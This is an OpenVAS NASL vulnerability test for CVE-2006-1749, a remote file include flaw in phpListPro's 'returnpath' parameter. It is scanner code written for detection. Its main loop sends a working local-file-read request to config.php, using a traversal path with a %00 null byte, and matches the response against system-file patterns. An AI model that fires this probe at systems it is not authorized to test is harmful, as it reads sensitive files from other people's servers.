# OpenVAS Vulnerability Test
# $Id: phplistpro_remote_file_include.nasl 11672 2018-09-28 10:48:17Z jschulte $
# Description: phpListPro returnpath Remote File Include Vulnerabilities
#
# Authors:
# Josh Zlatin-Amishav (josh at ramat dot cc)
#
# Copyright:
# Copyright (C) 2008 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.80077");
  script_version("$Revision: 11672 $");
  script_tag(name:"last_modification", value:"$Date: 2018-09-28 12:48:17 +0200 (Fri, 28 Sep 2018) $");
  script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_bugtraq_id(17448);
  script_cve_id("CVE-2006-1749");
  script_xref(name:"OSVDB", value:"24540");
  script_name("phpListPro returnpath Remote File Include Vulnerabilities");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2008 Josh Zlatin-Amishav");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"summary", value:"The remote web server contains a PHP application that is affected by
  remote file include vulnerabilities.

  Description :

  The remote host is running phpListPro, a web site voting/ranking tool
  written in PHP.

  The installed version of phpListPro fails to sanitize user input to
  the 'returnpath' parameter of the 'config.php', 'editsite.php',
  'addsite.php', and 'in.php' scripts before using it to include PHP
  code from other files.  An unauthenticated attacker may be able to
  read arbitrary local files or include a file from a remote host that
  contains commands which will be executed on the remote host subject to
  the privileges of the web server process.

  These flaws are only exploitable if PHP's 'register_globals' is
  enabled.");
  script_tag(name:"solution_type", value:"Mitigation");
  script_tag(name:"solution", value:"Edit the affected files as discussed in the vendor advisory above.");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2006-04/0206.html");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2006-05/0153.html");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2006-05/0199.html");
  script_xref(name:"URL", value:"http://www.smartisoft.com/forum/viewtopic.php?t=3019");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

files = traversal_files();
vtstring = get_vt_string();

# Google for '"PHPListPro Ver"|intitle:"rated TopList"'.
foreach dir(make_list_unique("/phplistpro", "/toplist", "/topsite", cgi_dirs(port:port))) {

  if(dir == "/") dir = "";

  foreach pattern(keys(files)) {

    file = "/" + files[pattern];

    req = http_get( item:string(dir, "/config.php?returnpath=" + file + "%00" ), port:port );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) continue;

    # There's a problem if...
    if (
        # there's an entry for root or...
        egrep(pattern:pattern, string:res) ||
        # we get an error saying "Failed opening".
        egrep(string:res, pattern:"Failed opening required '" + file + "\\0lang_.+")
    ) {
      if (egrep(pattern:pattern, string:res)) content = res;

      if (content)
        report = string(
          "Here are the repeated contents of the file '" + file + "' that\n",
          vtstring, " was able to read from the remote host :\n",
          "\n",
          content
        );

      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit( 99 );
